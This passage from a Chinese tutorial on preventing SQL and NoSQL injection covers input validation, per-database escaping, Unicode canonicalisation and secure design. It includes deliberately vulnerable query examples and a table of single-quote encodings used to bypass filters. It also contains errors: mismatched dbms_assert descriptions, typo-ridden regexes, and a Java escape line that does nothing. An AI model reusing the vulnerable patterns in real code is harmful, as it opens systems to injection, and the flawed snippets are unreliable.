id=\"在移动应用程序中检验输入\"><a href=\"#在移动应用程序中检验输入\" class=\"headerlink\" title=\"在移动应用程序中检验输入\"></a>在移动应用程序中检验输入</h4><p>移动应用程序中的数据既可以存储在远程服务器上，也可以存储在本地的应用中。对于这两种情况都需要在本地检验输入。对于远程存储的数据，需要在远程服务器端对输入进行检查。</p>\n<p>可以采用两种方式对输入搜索(in-device input)的输入数据进行检验。可以使用一种仅支持我们所期望数据类型的输入域类型(field type)，比如使用仅支持输入数字的输入域。另外也可以订阅输入域的change事件，当接收到无效输入时由事件处理程序进行处理。Android支持输入过滤器(input filter)的概念，它可以将一个或多个InputFilter的实现自动地应用于数据，并且可以拒绝无效的输入。</p>\n<h4 id=\"在HTML5中检验输入\"><a href=\"#在HTML5中检验输入\" class=\"headerlink\" title=\"在HTML5中检验输入\"></a>在HTML5中检验输入</h4><p>在开发HTML5应用程序时，数据可以存储在Web浏览器的本地存储中，也可以存储在承载HTML5Web应用程序的远程Web服务器上。对于存储在浏览器本地存储中的数据，可以使用JavaScript检验数据，或者使用HTML5提供的新类型的＜input＞输入域进行检验。这些＜input＞输入域支持required属性，该属性指示浏览器检查在该输入域中必须具有输入值。此外，还支持pattern属性，允许开发人员设置一个正则表达式，输入的数据必须满足该正则表达式的约束：</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">&lt;input type=\"text\" required= \"required\" pattern:\"^[0-9] {4}...<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果客户端应用程序正把数据发送回服务器端的应用程序， 那么服务器端代码必须总是重新检验它从HTML5应用程序中接收到的输入数据。</p>\n<h3 id=\"编码输出\"><a href=\"#编码输出\" class=\"headerlink\" title=\"编码输出\"></a>编码输出</h3><h4 id=\"编码发送给数据库的内容\"><a href=\"#编码发送给数据库的内容\" class=\"headerlink\" title=\"编码发送给数据库的内容\"></a>编码发送给数据库的内容</h4><p>有时白名单过滤并不能完全，可能还会动态拼接产生SQL注入，对于无法或不适合使用参数化语句的情况，有必要对发送给数据库的数据进行编码（或引用）</p>\n<h5 id=\"针对Oracle的编码\"><a href=\"#针对Oracle的编码\" class=\"headerlink\" title=\"针对Oracle的编码\"></a>针对Oracle的编码</h5><p>Oracle使用单引号作为字符串的结束符，因而有必要对包含在字符串（动态SQL中将包含该字符串）中的单引号进行编码。</p>\n<p>在Oracle中，可以通过使用两个单引号替换单个单引号的方法来实现编码目的。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">sql <span class=\"token operator\">=</span> sql<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"'\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"''\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>由于在PL/SQL中需要为单引号添加引用符（因为它是字符串结束符），因而在PL/SQL中需要使用两个单引号来替换单个单引号。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">sql <span class=\"token operator\">=</span> <span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">,</span> '''<span class=\"token char\">','</span>'''''''<span class=\"token punctuation\">)</span>；\nsql <span class=\"token operator\">=</span> <span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">,</span> <span class=\"token function\">CHR</span><span class=\"token punctuation\">(</span><span class=\"token number\">39</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">CHR</span><span class=\"token punctuation\">(</span><span class=\"token number\">39</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token function\">CHR</span><span class=\"token punctuation\">(</span><span class=\"token number\">39</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>对LIKE字句的通配符转义</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">WHERE</span> name <span class=\"token operator\">LIKE</span> <span class=\"token string\">'a%'</span>\n<span class=\"token comment\">-- 易受攻击。返回所有以\"a'字符开头的用户</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">WHERE</span> name <span class=\"token operator\">LIKE</span> <span class=\"token string\">'a\\%'</span> <span class=\"token keyword\">ESCAPE</span> <span class=\"token string\">'\\'\n-- 不容易受攻击，返回用户'</span>a<span class=\"token operator\">%</span><span class=\"token string\">',如果存在一个这样的用户的话\n'</span>\n<span class=\"token comment\">-- 使用ESCAPE子句时，可以指定任何单个字符作为转义字符</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>“q”引用，采用 q’[QUOTE CHAR]string[QUOTE CHAR]’格式。引用字符(quote character)可以是任何未出现在字符串中的单个字符</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">q<span class=\"token string\">'(5%)'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果无法使用参数化查询，就应该使用dbms_assert包来执行输入验证。dbms_assert提供了7个不同的函数(ENQUOTE_LITERAL、ENQUOTE_ NAME、NOOP、QUALIFIED_SQL_NAME、 SCHEMA_NAME、SIMPLE_SQL_NAME和SQL_OBJECT_NAME)来验证不同类型的输入。</p>\n<p>一个未使用dbms_assert的非安全查询(FIELD、OWNER和TABLE中存在SQL注入)：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">execute</span> immediate <span class=\"token string\">'select'</span><span class=\"token operator\">||</span> FIELD <span class=\"token operator\">||</span><span class=\"token string\">'from'</span><span class=\"token operator\">||</span> OWNER <span class=\"token operator\">||</span><span class=\"token string\">'.'</span><span class=\"token operator\">||</span> <span class=\"token keyword\">TABLE</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>下面是相同的查询，不过使用了dbms_assert进行输入验证：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">execute</span> immediate <span class=\"token string\">'select '</span> <span class=\"token operator\">||</span>sys<span class=\"token punctuation\">.</span>dbms_assert<span class=\"token punctuation\">.</span>SIMPLE_SQL_NAME<span class=\"token punctuation\">(</span>FIELD<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token string\">'from'</span> <span class=\"token operator\">||</span>sys<span class=\"token punctuation\">.</span>dbms_assert<span class=\"token punctuation\">.</span>ENQUOTE_NAME\n<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>dbms_assert<span class=\"token punctuation\">.</span>SCHEMA_NAME<span class=\"token punctuation\">(</span>OWNER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">FALSE</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">||</span><span class=\"token string\">'.'</span><span class=\"token operator\">||</span>sys<span class=\"token punctuation\">.</span>dbms_assert<span class=\"token punctuation\">.</span>QUALIFIED_SQL_NAME<span class=\"token punctuation\">(</span><span class=\"token keyword\">TABLE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>dbms assert 函数</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">函   数</th>\n<th>描   述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">DBMS_ASSERT.SCHEMA_NAME</td>\n<td>该函数检查传递的字符串是否为数据库中存在的对象</td>\n</tr>\n<tr>\n<td align=\"left\">DBMS_ASSERT.SIMPLE_SQL_NAME</td>\n<td>该函数检查SQL元素中是否只包含A-Z、a-z、0-9、$、 #和_这样的字符。如果使用双引号来引用参数，那么允许使用除双引号之外的所有字符</td>\n</tr>\n<tr>\n<td align=\"left\">DBMS_ASSERT.SQL_OBJECT_NAME</td>\n<td>该函数检查传递的字符串是否为数据库中存在的对象</td>\n</tr>\n<tr>\n<td align=\"left\">DBMS_ASSERT.QUALIFIED_SQL_NAME</td>\n<td>该函数与SIMPLE_SQL_NAME非常类似，不过它还允许数据库连接</td>\n</tr>\n<tr>\n<td align=\"left\">DBMS_ASSERT.ENQUOTE_LITERAL</td>\n<td>该函数使用双引号来引用传递的参数。如果参数已被引用，就不做任何事情</td>\n</tr>\n<tr>\n<td align=\"left\">DBMS_ASSERT.ENQUOTE_NAME</td>\n<td>如果未使用单引号引用用户提供的字符串，那么该函数会使用单引号来引用它</td>\n</tr>\n</tbody></table>\n<h5 id=\"针对MS-SQL的编码\"><a href=\"#针对MS-SQL的编码\" class=\"headerlink\" title=\"针对MS-SQL的编码\"></a>针对MS-SQL的编码</h5><p>MS-SQL使用单引号作为字符串的结束符，因而有必要对包含在字符串（动态SQL中将包含该字符串）中的单引号进行编码。</p>\n<p>在MS-SQL中，可以通过使用两个单引号替换单个单引号的方法来实现编码目的。</p>\n<pre class=\"line-numbers language-C#\" data-language=\"C#\"><code class=\"language-C#\">sql = sql.replace(\"'\",\"''\")<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>由于在Transact-SQL中需要为单引号添加引用符(因为它是字符串结束符)，因而在Transact-SQL中需要使用两个单引号来替换单个单引号。</p>\n<pre class=\"line-numbers language-c#\" data-language=\"c#\"><code class=\"language-c#\">SET @enc = replace(@input,'''','''''''')\n//使用字符编码表示上述内容逻辑性会更强，也更加清楚：\nSET @enc = replace(@input, CHAR(39), CHAR(39) + CHAR(39));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>对LIKE字句的通配符转义</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">Replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"[[]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">Replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"[%]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">Replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"[_]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">WHERE</span> name <span class=\"token operator\">LIKE</span> <span class=\"token string\">'a%'</span>\n<span class=\"token comment\">-- 易受攻击。返回所有以\"a'字符开头的用户</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">WHERE</span> name <span class=\"token operator\">LIKE</span> <span class=\"token string\">'a\\%'</span> <span class=\"token keyword\">ESCAPE</span> <span class=\"token string\">'\\'\n-- 不容易受攻击，返回用户'</span>a<span class=\"token operator\">%</span><span class=\"token string\">',如果存在一个这样的用户的话\n'</span>\n<span class=\"token comment\">-- 使用ESCAPE子句时，可以指定任何单个字符作为转义字符</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"针对MySQL的编码\"><a href=\"#针对MySQL的编码\" class=\"headerlink\" title=\"针对MySQL的编码\"></a>针对MySQL的编码</h5><p>由于MySQL使用单引号作为字符串字面量的结束符，因而有必要对包含在字符串(动态SQL中将包含该字符串)中的单引号进行编码。</p>\n<p>在MySQL中，使用两个单引号替换单个单引号来实现编码目的，也可以使用反斜线()来引用单引号。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">sql <span class=\"token operator\">=</span> sql<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"'\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\'\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>PHP还提供了mysql_real_escape()函数。该函数会自动使用反斜线来引用单引号及其他具有潜在危害的字符，例如0x00(NULL)、换行符(\\n)、回车符(\\r)、双引号(“)、反斜线() 和 Ox1A(Ctrl+Z)</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">mysql_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>由于需要为单引号添加引用符(因为它是字符串结束符)，因而在存储过程代码中需要使用两个单引号来替换单个单引号。</p>\n<pre class=\"line-numbers language-C#\" data-language=\"C#\"><code class=\"language-C#\">SET @sql = REPLACE(@sql,'\\'','\\\\\\'')\n//使用字符编码表示上述内容逻辑性会更强，也更加清楚：\nSET @enc = REPLACE(@input, CHAR(39) , CHAR(92, 39));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>对LIKE字句的通配符转义</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\%\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\_\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"针对PostgreSQL的编码\"><a href=\"#针对PostgreSQL的编码\" class=\"headerlink\" title=\"针对PostgreSQL的编码\"></a>针对PostgreSQL的编码</h5><p>PostgreSQL也使用单引号作为字符串字面量的结束符，可以采用两种办法对单引号进行编码。</p>\n<p>第一种方法使用两个单引号替换一个单引号。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$encodedValue</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"''\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>第二种办法是使用一个反斜线对单引号进行编码，但PostgreSQL还需要在字符串字面量之前放置一个大写的E字母</p>\n<pre class=\"line-numbers language-plsql\" data-language=\"plsql\"><code class=\"language-plsql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> User <span class=\"token keyword\">WHERE</span> LastName<span class=\"token operator\">=</span>E<span class=\"token string\">'O\\'Boyle'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在PHP中，可以使用add_slashes()或str_replace()方法对反斜线执行编码。在PHP中，对于PostgreSQL数据库而言，最佳的字符串编码方式是使用pq_escape_string()方法：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$encodedValue</span> <span class=\"token operator\">=</span> <span class=\"token function\">pg_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>该函数将调用libpq的PQescapeString()方法，它将把单反斜线替换为双反斜线，并且用两个单引号替换一个单引号</p>\n<p>在PostgreSQL中还可以采用其他办法创建字符串字面量，即使用$字符。$字符允许开发人员在SQL语句中使用类似于标记(tag-like)的功能。下面就是一个使用这种语法创建的字符串：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">User</span> <span class=\"token keyword\">WHERE</span> LastName<span class=\"token operator\">=</span>$quote$O'Boyle$quote$<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在这种情况下，对于用户输入的任何一个$字符，都需要确保使用一个反斜线进行转义处理： </p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$encodedValue</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"$\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\\\$\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"防止NoSQL注入\"><a href=\"#防止NoSQL注入\" class=\"headerlink\" title=\"防止NoSQL注入\"></a>防止NoSQL注入</h5><p>在NoSQL的查询API中，绝大多数方法都提供了将数据与代码清晰分离的方法。例如，当从PHP中使用MongoDB时，典型的方法是使用关联数组(associative array)插入数据：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$users</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"password\"</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>查询则如下所示：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$users</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">findOne</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"username\"</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>当使用这些API时，由于避免了使用字符串连接来构造查询，因此防止了注入攻击。</p>\n<p>对于更高级的查询，MongoDB允许开发人员使用$where关键字提交一个JavaScript函数：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$collection</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\$where\"</span> <span class=\"token operator\">=&gt;</span> <span class=\"token string double-quoted-string\">\"function(){ return this.username.indexOf('<span class=\"token interpolation\"><span class=\"token variable\">$test</span></span>') &gt; -1 }\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>该JavaScript函数很容易遭到注入攻击。攻击者可以转义indexOf()内的字符串，并改变查询执行的方式。为了防止这种攻击，我们必须对JavaScript进行编码。使用十六进制的\\xnn编码类型，或使用\\unnnn类型的Unicode编码，对所有非字母或数字的字符全部进行转 义，这是最安全的办法。</p>\n<h3 id=\"规范化\"><a href=\"#规范化\" class=\"headerlink\" title=\"规范化\"></a>规范化</h3><p>避开输入验证和输出编码的常用技术是：在将输入发送给应用程序之前对其进行编码，之后再对其进行解码和解释以符合攻击者的目标。</p>\n<p>单引号的例子</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">表示</th>\n<th align=\"center\">编码类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">%27</td>\n<td align=\"center\">URL编码</td>\n</tr>\n<tr>\n<td align=\"center\">%2527</td>\n<td align=\"center\">双URL编码</td>\n</tr>\n<tr>\n<td align=\"center\">%%317</td>\n<td align=\"center\">嵌套的双URL编码</td>\n</tr>\n<tr>\n<td align=\"center\">%u0027</td>\n<td align=\"center\">Unicode 表示</td>\n</tr>\n<tr>\n<td align=\"center\">%u02b9</td>\n<td align=\"center\">Unicode 表示</td>\n</tr>\n<tr>\n<td align=\"center\">%ca%b9</td>\n<td align=\"center\">Unicode 表示</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;apos</td>\n<td align=\"center\">HTML实体</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;#39</td>\n<td align=\"center\">十进制HTML实体</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;#x27</td>\n<td align=\"center\">十六进制HTML实体</td>\n</tr>\n<tr>\n<td align=\"center\">%26apos</td>\n<td align=\"center\">混合的URL/HTML编码</td>\n</tr>\n</tbody></table>\n<p>规范化是指将输入简化成标准或简单的形式，例如变成单引号</p>\n<h4 id=\"规格化方法\"><a href=\"#规格化方法\" class=\"headerlink\" title=\"规格化方法\"></a>规格化方法</h4><ul>\n<li>拒绝所有不符合格式的输入，例如利用白名单拒绝所有编码输入</li>\n<li>对输入多次解码，或者解码一次，若还需解码就抛弃</li>\n</ul>\n<h5 id=\"适用于Unicode的方法\"><a href=\"#适用于Unicode的方法\" class=\"headerlink\" title=\"适用于Unicode的方法\"></a>适用于Unicode的方法</h5><p>遇到像UTF-8这样的Unicode输入时，一种方法是将输入标准化（normalization）。该方法使用定义好的规则集将Unicode转换成最简单的形式。将双倍宽度及其他的Unicode编码在它们所处的位置转换成各自的ASCII 等价形式。</p>\n<p>使用Java中的Normalizer类（Java 6及以上版本）来将输入标准化</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">normalized <span class=\"token operator\">=</span> <span class=\"token class-name\">Normalizer</span><span class=\"token punctuation\">.</span><span class=\"token function\">normalize</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">,</span><span class=\"token class-name\">Normalizer<span class=\"token punctuation\">.</span>Form</span><span class=\"token punctuation\">.</span><span class=\"token constant\">NFKC</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用C#中String类的Normalize方法来将输入标准化</p>\n<pre class=\"line-numbers language-c#\" data-language=\"c#\"><code class=\"language-c#\">normalized = input.Normalize(NormalizationForm.FormKC);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用PHP中PEAR库的PEAR::I18N_UnicodeNormalizer包来将输入标准化</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$normalized</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">I18N_UnicodeNormalizer</span><span class=\"token operator\">::</span><span class=\"token function\">toNFKC</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'UTF-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>还有一种方法是首先检查Unicode是有效的，然后将数据转换成一种可预见的格式，例如像ISO-8859-1这样的西欧字符集。</p>\n<p>用于解析UTF-8的正则表达式</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">正则表达式</th>\n<th align=\"center\">描   述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">[x00-\\x7F]</td>\n<td align=\"center\">ASCII</td>\n</tr>\n<tr>\n<td align=\"center\">[\\xC2-\\xDF][\\x80-\\xBF]</td>\n<td align=\"center\">双字节表示</td>\n</tr>\n<tr>\n<td align=\"center\">\\xE0[\\xA0-\\xBF][\\x80-\\xBF]</td>\n<td align=\"center\">双字节表示</td>\n</tr>\n<tr>\n<td align=\"center\">[\\xEl-\\xEC\\xEE\\xEF][\\x80-\\xBF] {2}</td>\n<td align=\"center\">三字节表示</td>\n</tr>\n<tr>\n<td align=\"center\">\\xED [\\x80-\\x9F][\\x80-\\xBF]</td>\n<td align=\"center\">三字节表示</td>\n</tr>\n<tr>\n<td align=\"center\">\\xFO [\\x90-\\xBF][\\x80-\\xBF] {2}</td>\n<td align=\"center\">plane 1 至ij 3</td>\n</tr>\n<tr>\n<td align=\"center\">[\\xF 1 -\\xF3][\\x80-\\xBF] {3}</td>\n<td align=\"center\">panel 4 到 15</td>\n</tr>\n<tr>\n<td align=\"center\">\\xF4 [\\x80-\\x8F][\\x80-\\xBF] {2}</td>\n<td align=\"center\">panel 16</td>\n</tr>\n</tbody></table>\n<p>检查完输入是有效的格式后，现在可以将它转换成可预见的格式。</p>\n<p>在Java中，可以使用CharsetEncoder类或比较简单的getBytes()方法（Java 6及之后的版本）</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">string ascii <span class=\"token operator\">=</span> utf8<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ISO-8859-1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在C#中，可以使用Encoding.Converter类</p>\n<pre class=\"line-numbers language-C#\" data-language=\"C#\"><code class=\"language-C#\">byte[] asciiBytes = Encoding.Convert(Encoding.UTF8,Encoding.ASCII,utf8Bytes);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在PHP中，可以使用utf8_decode</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ascii <span class=\"token operator\">=</span> <span class=\"token function\">utf8_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$utf8string</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"通过设计来避免SQL注入的危险\"><a href=\"#通过设计来避免SQL注入的危险\" class=\"headerlink\" title=\"通过设计来避免SQL注入的危险\"></a>通过设计来避免SQL注入的危险</h3><h4 id=\"使用储存过程\"><a href=\"#使用储存过程\" class=\"headerlink\" title=\"使用储存过程\"></a>使用储存过程</h4><p>在大多数数据库中使用存储过程时都可以在数据库层配置访问控制。通过正确配置许可权限来保证攻击者无法访问数据库中的敏感信息。</p>\n<h4 id=\"使用抽象层\"><a href=\"#使用抽象层\" class=\"headerlink\" title=\"使用抽象层\"></a>使用抽象层</h4><p>表示、业务逻辑和数据访问定义不同的层，从而将每一层的实现从总体设计中抽象出来。</p>\n<h4 id=\"处理敏感数据\"><a href=\"#处理敏感数据\" class=\"headerlink\" title=\"处理敏感数据\"></a>处理敏感数据</h4><p>考虑数据库中敏感信息的存储和访问。</p>\n<p>口令：如果可能的话，不应该在数据库中存储用户口令。比较安全的做法是存储每个用户口令的加盐（salted）单向哈希（使用SHA256这样的安全哈希算法）而不是口令本身。</p>\n<p>信用卡及其他财务信息：应该使用认可的（比如FIPS认证过的）加密算法来对信用卡等信息进行加密，然后存储加密后的明细数据。</p>\n<p>存档：如果未要求应用程序保存提交给它的所有敏感信息（例如个人可识别的信息）的完整历史记录，就应考虑每隔一段合理的时间就存档或清除这些不需要的信息。</p>\n<h4 id=\"避免明显的对象名\"><a href=\"#避免明显的对象名\" class=\"headerlink\" title=\"避免明显的对象名\"></a>避免明显的对象名</h4><p>为关键对象（比如加密函数、口令列和信用卡列）选取名称时应该 格外小心，不要选取易被拆解的名字，如passwd</p>\n<h4 id=\"创建honeypot-蜜罐\"><a href=\"#创建honeypot-蜜罐\" class=\"headerlink\" 